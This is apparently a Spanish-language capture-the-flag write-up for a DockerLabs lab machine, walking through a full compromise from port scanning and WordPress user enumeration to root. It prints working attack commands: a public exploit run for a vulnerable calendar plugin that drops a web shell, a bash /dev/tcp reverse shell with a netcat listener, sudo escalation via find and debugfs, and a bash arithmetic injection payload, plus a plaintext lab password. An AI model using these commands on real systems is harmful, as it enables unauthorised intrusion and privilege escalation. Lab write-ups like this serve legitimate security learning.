Fecha: 02/09/2024
Comienzo escaneando la máquina: 
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.18.0.2 -oN scan
```

![](imágenes/Pasted%20image%2020240902202029.png)

Por lo que veo hay un servidor apache, así que hago fuzzing para buscar posibles urls:
```
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.18.0.2/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing  
```

![](imágenes/Pasted%20image%2020240902202710.png)

Encuentro el panel de login: wp-login.php. Uso la herramienta **wpscan** para enumerar usuarios, encontrando `erik` y `developer` 

```
wpscan --url http://172.18.0.2 --enumerate u
```

![](imágenes/Pasted%20image%2020240902203407.png)

Además, podemos ver que hay un directorio backups, al que accedo: 

![](imágenes/Pasted%20image%2020240902203854.png)

Descomprimo este directorio. Al leer el archivo que hay dentro, encuentro lo siguiente: 

![](imágenes/Pasted%20image%2020240902204206.png)

Pruebo ese usuario y contraseña en el panel de login y entro como administrador. Voy a los plugins y veo que hay uno desactualizado: Modern Events Calendar Lite (versión 5.16.2). Busco y al parecer hay una vulnerabilidad, y un exploit para la misma en en [github](https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24145/README.md).

![](imágenes/Pasted%20image%2020240902204756.png)

Uso el script de python y consigo una shell en http://172.18.0.2:80//wp-content/uploads/shell.php:
```
python3 exploit.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

Haciendo sudo -l encuentro lo siguiente que puedo usar `find` como "rafa": 

![](imágenes/Pasted%20image%2020240902205302.png)

Utilizo https://www.revshells.com/ para crear una reverse shell y trabajar más cómodamente: 
- En la shell virtual haré `bash -c 'bash -i >& /dev/tcp/172.18.0.1/9001 0>&1'`
- En mi máquina atacante haré `nc -lvnp 9001`
En https://gtfobins.github.io/gtfobins/find/#sudo encuentro:
```
sudo -u rafa find . -exec /bin/sh \; -quit
```

Como "rafa", puedo usar `debugfs` como "ruben":
![](imágenes/Pasted%20image%2020240902211145.png)

Usando lo encontrado en https://gtfobins.github.io/gtfobins/debugfs/#sudo:
```
sudo -u ruben debugfs
!/bin/sh
```

Y, finalmente, como "ruben":
![](imágenes/Pasted%20image%2020240902211401.png)

Podremos ejecutar /opt/penguin.sh como root, cuyo contenido es: 
![](imágenes/Pasted%20image%2020240902211749.png)

Como no encontré qué hacer a partir de aquí, busqué en writeups, encontrando https://github.com/haw441kings/DockerLabsWriteUps/blob/main/Faciles/Whoiam.md. En el mismo, explica que usando lo siguiente como respuesta estaremos inyectando una shell y al ejecutarlo como administrador seremos root: 

```
sudo -u root /opt/penguin.sh
a[$(/bin/bash>&2)]+42
```

![](imágenes/Pasted%20image%2020240902212443.png)

Analizando a posteriori, me di cuenta que el "+42" lo único que hace es que al salir del bash la salida sea "Correct" en vez de Wrong.

#TODO analizar como funciona la inyección. 